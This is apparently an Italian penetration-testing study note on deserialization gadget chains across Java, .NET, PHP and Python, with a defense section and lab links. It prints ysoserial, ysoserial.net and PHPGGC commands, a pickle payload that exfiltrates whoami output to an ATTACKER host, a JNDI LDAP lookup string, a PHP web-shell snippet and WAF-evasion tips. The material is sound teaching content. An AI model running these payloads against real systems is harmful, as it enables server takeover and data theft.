---
tipo: concetto
tag: [web, owasp, tool]
fase: 4
fonti: 4
aggiornato: 2026-06-26
stato: maturo
aliases: ["Insecure Deserialization Avanzata (gadget chains)", "Gadget Chains", "Deserializzazione Avanzata"]
---

# Insecure Deserialization Avanzata (gadget chains)

> [!warning] Uso etico
> Generare ed eseguire payload di deserializzazione **solo** su lab autorizzati (PortSwigger, HTB, CTF) o target in scope di bug bounty. Una gadget chain che porta a RCE è un'arma: usarla fuori contesto è reato.

## In breve
La pagina base [[Insecure Deserialization]] spiega *perché* deserializzare input non fidati è pericoloso. Qui andiamo al livello expert: come si **costruisce una gadget chain** quando l'applicazione non ha un metodo "comodo" che esegue codice. Si concatenano classi già presenti nel classpath (librerie, framework) i cui metodi, invocati automaticamente durante la deserializzazione, finiscono — passo dopo passo — in una *sink* pericolosa (`Runtime.exec`, `ProcessBuilder`, reflection, JNDI lookup).

## Anatomia di una gadget chain
Una chain è una catena `kick-off gadget → ...gadget intermedi... → sink gadget`:
- **Kick-off / trigger**: il magic method invocato all'ingresso (`readObject` in Java, `__wakeup`/`__destruct` in PHP, `__reduce__` in pickle). È il punto da cui parte l'esecuzione.
- **Gadget intermedi**: chiamano `equals`, `hashCode`, `toString`, `get`, `compare`... su oggetti annidati, spostando il flusso di controllo.
- **Sink**: l'operazione realmente dannosa (esecuzione comando, lettura file, lookup remoto, template injection).

Il punto chiave: **nessuna di queste classi è "vulnerabile" da sola**. La vulnerabilità emerge dalla loro composizione, abilitata dal fatto che l'attaccante controlla la struttura dell'oggetto serializzato.

## Java — ysoserial
`ysoserial` è il generatore di riferimento. Sceglie la chain in base alle librerie nel classpath del target.

```bash
# Genera un payload base64 con la chain CommonsCollections1 che esegue "id"
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0

# Chain alternativa se CC1 è patchata (CC < 3.2.2 vs versioni successive)
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/x' | base64 -w0

# Senza dipendenze esterne: solo JDK (URLDNS per fingerprinting/detection out-of-band)
java -jar ysoserial.jar URLDNS 'http://COLLAB.oastify.com' | base64 -w0
```

Riconoscere un blob Java serializzato: inizia con i byte `AC ED 00 05`, in base64 `rO0AB...`.

`URLDNS` non esegue codice: forza solo una risoluzione DNS. È la sonda perfetta — se ricevi il DNS lookup su [[Burp Suite]] Collaborator, il target deserializza input non fidato anche se la chain RCE è bloccata.

## .NET — ysoserial.net
Equivalente per l'ecosistema .NET (`BinaryFormatter`, `LosFormatter`, `Json.NET` con `TypeNameHandling`, `ObjectStateFormatter` per il ViewState ASP.NET).

```bash
# Gadget TypeConfuseDelegate, formatter BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"

# ViewState ASP.NET con MachineKey nota → RCE classica
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --generator=<gen> --validationkey=<KEY> --validationalg=SHA1 -c "cmd /c whoami"
```

## PHP — POP chain (Property Oriented Programming)
In PHP la chain si chiama **POP chain**: si costruisce a mano un oggetto annidato che, alla `__destruct`/`__wakeup`, attraversa metodi fino a una sink (`call_user_func`, `file_put_contents`, `eval`). **PHPGGC** è l'arsenale pronto (Laravel, Symfony, Monolog, Guzzle...).

```bash
# PHPGGC: catena Monolog/RCE1 che esegue "system('id')"
phpggc Monolog/RCE1 system 'id'

# Output serializzato pronto da incollare in un cookie/parametro
phpggc -b Laravel/RCE9 system 'id'    # -b = base64
```

```text
# Esempio concettuale di POP chain minimale
O:6:"Logger":1:{s:8:"logfile";O:8:"FileSink":1:{s:4:"data";s:14:"<?php system($_GET[c]); ?>";}}
```

## Python — pickle e oltre
Oltre al classico `__reduce__` (vedi [[Insecure Deserialization]]), nota i vettori "subdoli":
```python
import pickle, os
class P:
    def __reduce__(self):
        return (os.system, ("curl http://ATTACKER/$(whoami)",))
payload = pickle.dumps(P())     # eseguito da pickle.loads() sul server
```
Anche `PyYAML` con `yaml.load()` senza `SafeLoader` istanzia oggetti arbitrari:
```yaml
!!python/object/apply:os.system ["id"]
```

## Java alternativo a ysoserial: JNDI injection
Se la chain raggiunge un `InitialContext.lookup()` (es. via `BadAttributeValueExpException` + `JdbcRowSetImpl`), si entra nel territorio **Log4Shell/JNDI**: il server fa lookup LDAP/RMI verso l'attaccante che serve una classe malevola.
```text
jndi:ldap://ATTACKER:1389/Exploit   # marshalsec come server LDAP/RMI di riferimento
```

## Varianti e bypass
- **Look-ahead deserialization filters** (Java `ObjectInputFilter`, JEP 290): si bypassano con chain che usano classi *consentite* dall'allow-list.
- **Gadget "non firmate"**: se l'app firma il blob con HMAC ma la chiave è debole/leakata → si rifirma il payload.
- **Sink alternative**: non solo RCE — anche SSRF (URLDNS, JNDI), file write (arbitrary file), DoS (billion laughs sui formati testuali).
- **Magic byte mangling**: alcuni WAF cercano `rO0`; comprimere/ricodificare (gzip+base64) può eludere filtri ingenui.

## Impatto
Tipicamente **RCE pre-auth** con i privilegi del processo applicativo → compromissione totale del server. È tra le vulnerabilità a più alto impatto del web (Log4Shell, numerosi CVE enterprise Java/.NET).

## Come difendersi
1. **Non deserializzare dati non fidati.** Usa formati dati puri (JSON/Protobuf) con parser che *non* istanziano tipi arbitrari.
2. **Integrità**: HMAC/firma sul blob con chiave robusta e segreta; verifica *prima* di deserializzare.
3. **Allow-list di tipi** (`ObjectInputFilter` in Java 9+, `SerializationBinder` in .NET). Mai `BinaryFormatter` su input esterni (deprecato e rimosso nelle versioni recenti di .NET).
4. **Aggiorna le librerie**: molte chain dipendono da versioni vulnerabili (Commons-Collections < 3.2.2, ecc.).
5. **Disabilita lookup remoti JNDI** e aggiorna Log4j (≥ 2.17).
6. Per Python: `yaml.safe_load`, mai `pickle` su input esterni.

## Lab
- PortSwigger — Insecure deserialization (include lab "Developing a custom gadget chain for Java/PHP deserialization", "Using PHAR deserialization to deploy a custom gadget chain"): https://portswigger.net/web-security/deserialization
- PortSwigger lab: "Exploiting Java deserialization with Apache Commons": https://portswigger.net/web-security/deserialization/exploiting
- HackTricks — Deserialization: https://book.hacktricks.xyz/pentesting-web/deserialization
- HackTheBox: macchine "Time" (Java/Jackson), "JSON" (.NET Json.NET), Pro Labs con catene .NET ViewState.

## Collegamenti
- [[Insecure Deserialization]]
- [[Cookie e JWT]]
- [[SSTI Avanzato e Sandbox Escape]]
- [[Burp Suite]]
- [[OWASP Top 10]]

## Fonti
- PortSwigger — Insecure deserialization: https://portswigger.net/web-security/deserialization
- frohoff/ysoserial: https://github.com/frohoff/ysoserial
- pwntester/ysoserial.net: https://github.com/pwntester/ysoserial.net
- ambionics/phpggc: https://github.com/ambionics/phpggc
- OWASP — Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
